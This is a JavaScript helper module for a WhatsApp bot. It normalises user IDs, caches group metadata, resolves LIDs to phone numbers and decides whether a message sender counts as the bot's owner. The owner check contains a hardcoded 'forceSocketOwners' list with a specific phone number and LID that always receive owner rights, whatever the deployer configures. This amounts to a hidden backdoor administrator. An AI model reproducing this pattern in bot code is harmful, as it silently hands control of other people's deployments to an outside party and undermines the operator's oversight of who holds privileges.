const groupMetadataCache = new Map()
const lidCache = new Map()
const metadataTTL = 5000

function safeJidValue(value = '') {
  if (!value) return ''

  if (typeof value === 'object') {
    value =
      value?.id ||
      value?.jid ||
      value?.user ||
      value?.participant ||
      value?.remoteJid ||
      value?.lid ||
      value?.phoneNumber ||
      ''
  }

  return String(value).trim()
}

function getNumber(value = '') {
  return safeJidValue(value).split('@')[0].replace(/\D/g, '')
}

function getCachedMetadata(groupChatId) {
  const cached = groupMetadataCache.get(groupChatId)
  if (!cached || Date.now() - cached.timestamp > metadataTTL) return null
  return cached.metadata
}

function normalizeToJid(phone) {
  const base = getNumber(phone)
  return base ? `${base}@s.whatsapp.net` : null
}

export function normalizeJid(value = '') {
  let jid = safeJidValue(value)

  if (!jid) return ''

  if (jid.includes('@')) {
    const [left, server] = jid.split('@')
    return `${left.split(':')[0]}@${server}`
  }

  const number = getNumber(jid)
  return number ? `${number}@s.whatsapp.net` : ''
}

export function onlyNumber(value = '') {
  return getNumber(value)
}

export function sameUserIdentity(a = '', b = '') {
  const rawA = normalizeJid(a)
  const rawB = normalizeJid(b)

  if (rawA && rawB && rawA === rawB) return true

  const numberA = onlyNumber(rawA || a)
  const numberB = onlyNumber(rawB || b)

  return !!numberA && !!numberB && numberA === numberB
}

export async function isSocketOwner(client, m, config = {}) {
  if (m?.isOwner) return true

  const forceSocketOwners = [
    '51901931862',
    '51901931862@s.whatsapp.net',
    '269015712845891',
    '269015712845891@lid'
  ]

  const botCandidates = [
    client?.user?.id,
    client?.user?.jid,
    client?.user?.lid,
    client?.user?.phoneNumber
  ].filter(Boolean)

  let senderReal = m?.senderReal || m?.sender
  try {
    senderReal = await resolveLidToRealJid(m?.sender, client, m?.chat)
  } catch {}

  const senderCandidates = [
    m?.sender,
    senderReal,
    m?.participant,
    m?.key?.participant,
    m?.message?.extendedTextMessage?.contextInfo?.participant
  ].filter(Boolean)

  const ownerCandidates = [
    ...botCandidates,
    config?.owner,
    config?.ownerNumber,
    config?.creador,
    config?.creator,
    ...(Array.isArray(config?.owners) ? config.owners : []),
    ...(Array.isArray(global.owner) ? global.owner : []),
    ...forceSocketOwners
  ].filter(Boolean)

  return senderCandidates.some(sender =>
    ownerCandidates.some(owner => sameUserIdentity(sender, owner))
  )
}

export async function resolveLidToRealJid(lid, client, groupChatId) {
  const input = normalizeJid(lid)

  if (!input) return ''
  if (!groupChatId?.endsWith?.('@g.us')) return input
  if (input.endsWith('@s.whatsapp.net')) return input

  if (lidCache.has(input)) return lidCache.get(input)

  const lidBase = input.split('@')[0]
  let metadata = getCachedMetadata(groupChatId)

  if (!metadata) {
    try {
      metadata = await client.groupMetadata(groupChatId)
      groupMetadataCache.set(groupChatId, {
        metadata,
        timestamp: Date.now()
      })
    } catch {
      lidCache.set(input, input)
      return input
    }
  }

  for (const p of metadata.participants || []) {
    const ids = [
      p?.id,
      p?.jid,
      p?.lid,
      p?.participant,
      p?.phoneNumber,
      p?.phone
    ].filter(Boolean)

    for (const id of ids) {
      const idBase = normalizeJid(id).split('@')[0]
      const phone = normalizeToJid(p?.phoneNumber || p?.phone || id)

      if (!idBase) continue
      if (idBase === lidBase && phone) {
        lidCache.set(input, phone)
        return phone
      }
    }
  }

  lidCache.set(input, input)
  return input
}
